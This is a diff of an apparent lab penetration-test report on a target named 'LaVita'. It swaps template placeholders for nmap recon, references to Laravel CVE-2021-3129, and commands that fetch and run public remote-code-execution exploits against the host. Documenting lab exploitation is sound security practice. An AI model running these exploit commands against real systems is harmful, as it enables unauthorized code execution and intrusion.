@@ -1,10 +1,10 @@
-# Report - hackme.examplebox
+# Report - LaVita
 
 - Author: Henry Post
-- Target: hackme.examplebox
+- Target: LaVita
 - Target IP: 1.2.3.4
 - Attacker IP: 2.3.4.5
-- Date: 03/01/2026
+- Date: 05/05/2026
 
 ## Executive Summary
 
@@ -25,49 +25,59 @@ From there, I identified a binary with elevated capabilities and used it to pivo
 
 ## Resources
 
-- resource1
-- github link
-- medium link
-- exploit-db link
+- https://www.exploit-db.com/exploits/49424
+- https://nvd.nist.gov/vuln/detail/CVE-2021-3129
+- https://github.com/knqyf263/CVE-2021-3129/blob/main/attacker/exploit.py
 
 ## Recon
 
+Edit `/etc/hosts` for easy hostnames.
+
 I ran an nmap scan that enumerated their ports:
 
-    nmap -sS -sV $TARGET
+    nmap -sS -sV lavita
 
-(IMG_PLACEHOLDER)
+Very simple port layout:
 
-I then logged in to the `ladon` tool on port `8000` using `admin:admin` as the credential:
+| port | service |
+| ---- | ------- |
+| 22   | ssh     |
+| 80   | http    |
 
-(IMG_PLACEHOLDER)
+Let's visit http://lavita .
 
 ## Non-root access
 
-I searched through exploit-db for CVE-2025-1234, and found a script:
+http://lavita/action_page.php?Name=a&Email=a&Message=a&Like=on - This page shows us that they're running `Laravel 8.4.0`.
 
-(IMG_PLACEHOLDER)
+```sh
+searchsploit laravel
 
-I ran the script once, and it failed:
+# Laravel 8.4.2 debug mode - Remote code execution | php/webapps/49424.py
 
-    python 50640.py -t 192.168.68.24 -p 8000 -L 192.168.49.68 -p 4444
+searchsploit --path 49424
 
-(IMG_PLACEHOLDER)
+cp /usr/share/exploitdb/exploits/php/webapps/49424.py ./
 
-So, I created a "Project" in Gerapy's web UI.
+python 49424.py http://lavita /var/www/html/laravel/storage/logs/laravel.log id
+```
 
-(IMG_PLACEHOLDER)
+![](Pasted%20image%2020260505132110.png)
 
-I ran it again, and it succeeded.
+It seems to be stuck. I'll try to find a different PoC for CVE-2021-3129...
 
-(IMG_PLACEHOLDER)
-    
-    ip a
-    whoami
-    hostname
-    date
-    cat local.txt
+```sh
+wget https://raw.githubusercontent.com/knqyf263/CVE-2021-3129/refs/heads/main/attacker/exploit.py
 
+python exploit.py http://lavita
+```
+
+We need to edit `exploit.py`, near the bottom. Let's do that. Actually, I will make a parameterized version.
+
+```sh
+nano exploit.py
+# (make edits for hostname and command...)
+```
 ## Root access
 
 For root access, I started by searching for binaries with this command that had the capability to run as root set:
